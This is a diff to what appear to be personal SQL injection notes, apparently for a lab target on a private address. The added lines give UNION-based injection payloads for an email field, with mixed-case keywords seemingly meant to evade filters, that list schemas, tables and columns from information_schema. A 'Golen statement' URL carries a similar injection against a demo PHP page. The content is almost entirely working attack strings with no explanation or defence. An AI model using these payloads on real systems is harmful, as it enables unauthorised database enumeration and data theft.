@@ -636,7 +636,9 @@ Example 3. Identify version info
 Example 4. Understand system behavior. How many outputs the query have? Which value goes where?
 	
 	a@b.com'  uniOn select 1,2,3, 'a@b.com'-- -
-	
+Example 5. Identify 
+	a@b.com'  uniOn select 1,2,3,concat(Table_schema,table_name,column_name,'a@b.com')  from inFormation_schema.columns limit 1;-- -
+	a@b.com'  uniOn select 1,2,3,concat(Table_schema,table_name,column_name,'a@b.com')  from inFormation_schema.columns where TABLE_schema !='informatiOn_schema' limit 1;-- -
 
 Golen statement
 	 http://172.20.22.134/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns union select table_schema,column_name,table_name from information_schema.columns 
